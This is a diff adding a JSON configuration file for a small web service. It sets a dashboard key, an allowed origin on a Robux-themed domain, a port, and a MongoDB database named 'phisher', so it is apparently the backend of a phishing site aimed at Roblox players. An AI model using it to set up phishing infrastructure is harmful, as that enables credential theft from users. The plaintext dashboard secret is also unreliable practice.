@@ -1,0 +1,8 @@
+{
+    "dashboardAuthKey": "roblux",
+    "allowedOrigins": ["robux.memester.xyz"],
+    "logsPath": "logs",
+    "logRetentionCount": 10,
+    "port": 5055,
+    "dbconn": "mongodb://localhost/phisher"
+}
